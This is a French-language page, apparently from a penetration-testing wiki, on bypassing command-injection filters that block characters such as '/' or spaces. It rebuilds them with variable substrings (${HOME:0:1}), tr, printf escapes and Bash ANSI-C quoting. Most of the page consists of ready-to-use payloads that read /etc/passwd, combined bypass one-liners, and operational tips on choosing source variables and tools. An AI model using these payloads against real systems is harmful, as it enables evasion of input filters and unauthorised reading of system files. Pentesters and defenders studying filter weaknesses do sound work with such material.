---
order: 5
title: "Contournement de filtre d'injection de commande par reconstruction de caractères"
description: "Reconstruire des caractères interdits comme / à partir de sous-chaînes de variables d'environnement (${HOME:0:1}), de la traduction tr et de printf, pour qu'un filtre bloquant des caractères spécifiques ne les voie jamais dans la requête."
keywords:
  - injection de commande
  - reconstruction de caractères
  - contournement de filtre
  - sous-chaîne de variable d'environnement
  - tr
  - printf
---

# Reconstruction de caractères

Certains filtres bloquent des **caractères spécifiques** plutôt que des mots-clés entiers, le plus souvent `/`, mais aussi `.`, `;` ou les espaces. La parade consiste à reconstruire le caractère interdit à partir de matière que le shell détient déjà : une sous-chaîne d'une variable d'environnement, une traduction avec `tr` ou un octet émis par `printf`. Le shell produit le caractère à l'exécution, de sorte qu'il n'apparaît jamais dans la requête que le filtre inspecte.

## Pourquoi le shell le normalise

Le filtre opère sur les octets littéraux de la requête. Si `/` figure sur la liste de blocage, `cat /etc/passwd` est rejeté. Mais `${HOME:0:1}` est une expansion de paramètre dont la *valeur* est `/`, et le filtre ne voit que les lettres `H`, `O`, `M`, `E`, les accolades, les chiffres et un deux-points, dont aucun n'est une barre oblique. Le shell évalue l'expansion avant l'exécution et substitue le véritable `/`. Le caractère bloqué est fabriqué à partir du contenu d'une variable plutôt que tapé, de sorte que la liste de blocage littérale n'a rien à faire correspondre.

## Reconstruire `/` à partir de sous-chaînes de variables

Toute variable dont la valeur commence par (ou contient) une barre oblique en fournit une par découpage :

```
${HOME:0:1}          # "/"  (HOME=/home/...)
${PATH:0:1}          # "/"  (PATH=/usr/bin:...)
${PWD:0:1}           # "/"
```

Assemblez un chemin complet sans aucune barre oblique littérale dans la requête :

```
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat$IFS${PATH:0:1}etc${PATH:0:1}passwd
```

Choisissez un offset/une longueur différents pour extraire d'autres caractères qu'une variable contient par hasard (`:` depuis `$PATH`, `.` depuis une chaîne de version, des lettres pour un mot-clé).

## Reconstruire des caractères avec `tr`

`tr` traduit un jeu de caractères en un autre, de sorte qu'un caractère d'entrée bénin peut être transformé en un caractère interdit à l'exécution :

```
echo . | tr '.' '/'                  # emits "/"
cat $(echo _etc_passwd | tr '_' '/') # "/etc/passwd" from underscores
```

Ici la requête contient des underscores, pas des barres obliques ; `tr` effectue la substitution à l'intérieur de la substitution de commande, et `cat` reçoit le chemin reconstruit.

## Reconstruire des caractères avec printf / octal / hexadécimal

`printf` peut émettre des octets arbitraires à partir de séquences d'échappement, produisant un caractère que le filtre bloque :

```
cat $(printf '\57')etc$(printf '\57')passwd   # \57 is octal for "/"
printf '\x2f'                                  # hex for "/"
```

Le quoting ANSI-C de Bash fait de même en ligne, sans binaire externe :

```
cat $'\x2f'etc$'\x2f'passwd                    # $'\x2f' → "/"
```

Les séquences d'échappement sont de l'ASCII simple dans la requête ; le shell les décode en l'octet interdit uniquement au moment de l'exécution.

## Combiner les caractères reconstruits

Ces primitives se composent avec les astuces sans espace et d'expansion, de sorte qu'une commande peut éviter plusieurs caractères bloqués à la fois :

```
cat${IFS}${HOME:0:1}etc${HOME:0:1}passwd
{cat,$'\x2f'etc$'\x2f'passwd}
```

Chaque barre oblique, chaque espace et chaque fragment de mot-clé est produit par le shell, ne laissant rien à attraper à un filtre qui bloque les `/` littéraux et les espaces.

## Notes opérationnelles

- L'expansion de sous-chaîne `${VAR:0:1}` et le quoting ANSI-C `$'\xNN'` sont des fonctionnalités de **Bash** ; `tr`/`printf` fonctionnent dans n'importe quel shell POSIX (à condition que ces binaires ne soient pas eux-mêmes filtrés).
- Choisissez une variable source dont la présence est garantie, `HOME`, `PATH` et `PWD` commencent de manière fiable par `/`.
- La méthode reconstruit des **caractères** ; combinez-la avec les techniques d'accolades/glob/variables lorsque des noms de commandes entiers sont également filtrés.

## Outils

- **[Burp Suite](https://portswigger.net/burp)** : Repeater pour concevoir des payloads à caractères reconstruits.
- **[commix](https://github.com/commixproject/commix)** : les scripts tamper automatisent les contournements de caractères et d'espaces.

## Références

- [PayloadsAllTheThings: Command Injection, Bypass without specific characters](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [Bash Reference Manual: Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html)
